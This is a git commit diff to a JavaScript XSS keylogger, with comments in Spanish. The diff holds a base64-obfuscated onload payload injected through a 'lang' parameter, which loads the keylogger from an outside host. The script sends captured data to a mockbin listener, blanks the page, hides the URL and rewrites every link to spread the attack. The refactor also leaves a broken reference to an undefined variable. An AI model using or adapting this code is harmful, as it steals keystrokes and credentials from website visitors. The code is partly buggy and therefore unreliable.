685a73f1af41d79d1936cf01b24ca07dfb67446b
CTPache <33907485+CTPache@users.noreply.github.com>
2024-03-27 12:18:20 +0100

    Cleanup y comentarios

--- keylogger_x.js
+++ keylogger_x.js
@@ -1,4 +1,6 @@
 var https_listener_for_logging = 'https://1f84a21f49834055849d5bce74489025.api.mockbin.io/'
+var param_vuln = 'lang'
+var payload_vuln = "\"onload=\"eval(atob('Y29uc3Qgbm9kZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO25vZGUuc2V0QXR0cmlidXRlKCJzcmMiLCJodHRwczovL2N0cGFjaGUuZ2l0aHViLmlvL1hTUy9rZXlsb2dnZXJfeC5qcyIpO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF0uYXBwZW5kQ2hpbGQobm9kZSk7'))"
 // Borramos el contenido para que parezca que sigue cargando
 document.body.innerHTML = '';
 // Esto cambia la URL que muestra el navegador, para que no se vea el payload
@@ -23,11 +25,12 @@ fetch(newUrl)
                 })
             })
         });
+        // Envenenamos los links
         var links = document.querySelectorAll('a');
         links.forEach(a => {
-            let l = new URL(a.href)
-            l.searchParams.set("lang","\"onload=\"eval(atob('Y29uc3Qgbm9kZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO25vZGUuc2V0QXR0cmlidXRlKCJzcmMiLCJodHRwczovL2N0cGFjaGUuZ2l0aHViLmlvL1hTUy9rZXlsb2dnZXJfeC5qcyIpO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF0uYXBwZW5kQ2hpbGQobm9kZSk7'))")
-            a.setAttribute('href',l.href)
+            let l_url = new URL(a.href)
+            l.searchParams.set(param_vuln, payload_vuln)
+            a.setAttribute('href',l_url.href)
         });
         console.clear();
     })
